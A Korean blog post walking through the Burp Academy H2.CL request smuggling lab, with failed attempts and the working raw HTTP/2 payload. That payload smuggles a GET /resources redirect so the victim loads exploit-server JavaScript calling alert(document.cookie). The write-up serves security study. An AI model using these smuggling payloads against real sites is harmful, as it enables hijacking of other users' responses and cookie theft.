---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: H2.CL request smuggling"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-31 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 여기서부터는 HTTP 프로토콜2를 사용하는 서버에 대한 스머글링을 사용한다.Advanced 토픽이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling
- 취약점 설명페이지: https://portswigger.net/web-security/request-smuggling/advanced
- 난이도: PRACTITIONER (보통)

# 취약점 개요 (H2.CL)
- HTTP/2에서는 CL헤더가 존재하지 않는다. 서버측이 보내진 컨텐츠의 길이를 보고 정확한 값을 계산하는 프로토콜 사양이다.
- 따라서, HTTP/2에서는 스머글링이 가능하지 않다. 
- 한편, 프론트엔드/백엔드 서버로 이루어진 사이트에서, 프론트엔드 서버가 HTTP/2를 사용한다고 해도, 백엔드서버가 HTTP/1만 사용가능하기 때문에 백엔드 서버에 요청을 전달할 때는 HTTP/1로 다운그레이드하는 방식이 널리 퍼져있다. (대부분의 리버스 프록시가 이런 식으로 동작한다고 한다.)
- 다운그레이드하게 되면 CL이나 TE를 볼 수 밖에 없다. 
- 따라서 프론트엔드는 HTTP/2로 통신하지만 백엔드는 HTTP/1의 CL이나 TE헤더를 보는 경우의 수가 생긴다. (H2.CL이나 H2.TE타입이 나온다. )
- 이번 랩은 H2.CL 타입이다. 
- 프론트엔드는 CL을 안보지만 백엔드는 CL을 본다. 
- **CL 값을 0으로 줘서, 백엔드 입장에서 봤을 때 스머글링 하는 요청은 별도 요청으로 인식하도록 하는 테크닉을 사용할 수 있다.**

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드 서버는 HTTP/2 요청을 백엔드에 전송할 때 HTTP1으로 다운그레이드한다. 
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, victim의 브라우저에서 exploit서버의 악의적인 Javascript파일을 로드해서 실행시키면 된다. (`alert(document.cookie)`를 수행하는 Javascript다.) 
- victim은 10초마다 웹 사이트를 방문한다. 

```
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.
```

# 풀이 시도
- exploit 서버가 주어져 있다. 
- 프론트엔드는 HTTP/2로 동작하고, 백엔드는 HTTP/1.1이고 CL헤더를 인식한다. (그래서 H2.CL 이다.)
- victim이 exploit서버의 자바스크립트 파일을 읽어들이도록 만들어야 한다. 

1. 다음과 같은 요청을 시도해봤지만 응답은 항상 같은 200응답이었다. 어딘가 놓치고 있는 부분이 있는 것 같다. 

```http
POST / HTTP/2
Host: 0a0a00f0043d8663829f34c800d30018.web-security-academy.net
Cookie: session=B3LiF7FBl5KdzUiUkyPVXDpoDAZdl9Tj
Content-Length: 124

GET /exploit HTTP/1.1
Host: https://exploit-0a6600ba046a86708218330f019000be.exploit-server.net 
Content-Length: 10

x=1
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8771

<!DOCTYPE html>
```

2. 아하, Content-Length값은 작게해주어야 했다. (프론트엔드는 CL헤더를 보지 않지만 백엔드는 본다. 따라서 스머글링용 요청앞에 몇 바이트를 추가하고, 이 바이트수만큼 CL헤더에 값을 주면 백엔드가 인식해서 처리해줄 것이다.) 따라서 다음과 같이 바꿨더니 두번째 요청의 응답에서 404를 확인할 수 있었다. 스머글링 자체는 되고 있는 것 같다. 

![CL헤더 값 변경후](/images/burp-academy-hrs-13-1.png)

3. 그런데 왜 404응답인 걸까? 스머글링 하는 `GET /exploit` 은 exploit서버에서는 정상적으로 동작하는 요청이다. 

어쩌면 스머글링 요청의 Host헤더 값은 무시하는 걸수도 있다. 다음 테스트로 그 것을 확인했다. exploit서버에는 존재하지 않는 경로지만 랩서버에는 존재하는 경로로 요청을 보내면 응답이 있었다. 

![어느 곳을 보는지 확인](/images/burp-academy-hrs-13-2.png)

4. 그렇다면 Host를 포함해서 풀경로를 적어본다. 음.. 안된다. 

![풀경로 적었을 때](/images/burp-academy-hrs-13-3.png)

5. 랩 서버에서 오픈 리다이렉트가 되는지 확인해본다. 만약 있다면 exploit서버로 리다이렉트되는 요청을 밀반입시켜서 유저에게 전달할 수 있을 것이다. 

음... 모르겠다. `POST /post/comment` 요청이 다음과 같이 302응답을 회신해주긴한다. 그러나 Location값을 임의로 지정할 수가 없다. Origin이나 Referer등에 exploit서버의 URL을 지정해도 돌아오는 Location 값은 변함이 없었다. 

```
HTTP/2 302 Found
Location: /post/comment/confirmation?postId=8
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

# 답 보고 풀이 
6. 아하.. `/resources` 가 302응답을 해주는 엔드포인트였다. (이런 걸 스스로 찾아낼 수 있을까? )

![302응답 엔드포인트](/images/burp-academy-hrs-13-4.png)

7. exploit서버의 `/resources` 경로로 요청이 오면 `alert(document.cookie)`를 내려주도록 준비해둔다.

8. 다음 페이로드를 사용해서 302응답이 되도록 만든다. 두세번 요청하면 302응답을 확인할 수 있었다. 

```http
POST / HTTP/2
Host: 0a4900cc037a9dfe877e01e600ff002f.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0acc004303029dd5879f00d9014900bf.exploit-server.net
Content-Length: 5

x=1
```

![302응답 엔드포인트](/images/burp-academy-hrs-13-5.png)

9. victim이 10초마다 사이트를 방문하므로 타이밍이 맞아야 한다. 성공 메세지가 뜰 때까지 페이로드를 보내는 것을 반복한다. 5~6번 반복하니 성공했다. 

![풀이 성공](/images/burp-academy-hrs-13-success.png)


메모. 
# CL.0
- 프론트엔드는 CL헤더를 보지만 백엔드는 보지 않는 경우. (CL값이 0인것으로 인식하는 것과 같기 때문에 CL.0라고 부름)
- 양 서버가 서로 다른 해석을 하므로 이 경우도 HRS가 가능하다. 
- TE헤더를 추가하거나 할 필요가 없기 때문에 브라우저에서도 테스트가능하다. 
- 
